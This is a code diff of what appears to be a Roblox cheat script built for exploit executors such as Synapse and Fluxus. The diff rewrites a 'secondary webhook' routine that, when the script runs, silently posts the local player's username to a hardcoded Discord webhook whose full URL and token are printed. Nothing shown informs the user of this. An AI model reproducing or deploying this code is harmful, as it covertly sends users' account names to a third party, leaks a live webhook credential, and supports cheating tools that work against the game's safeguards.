@@ -212,19 +212,25 @@ else
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(abcdef)
 end
-local HttpService = game:GetService("HttpService")
 local webhookURL = "https://discord.com/api/webhooks/1348612109491109908/-pg-OWh0WQuVhUdhDCBLamlKEq_Sy6qzgLcxY4x0hXOWdjnZmQPEVXmPqFgkvR3FrsaH"
 
-local function sendSecondaryWebhook(username)
-    local data = {
-        content = username
-    }
-    local jsonData = HttpService:JSONEncode(data)
+local playerName = game.Players.LocalPlayer.Name
+local payload = {
+    content = playerName 
+}
 
-    HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
-end
+local jsonData = game:GetService("HttpService"):JSONEncode(payload)
 
-local player = game.Players.LocalPlayer
-if player then
-    sendSecondaryWebhook(player.Name)
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+local sendRequest = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+if sendRequest then
+    sendRequest({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonData
+    })
 end
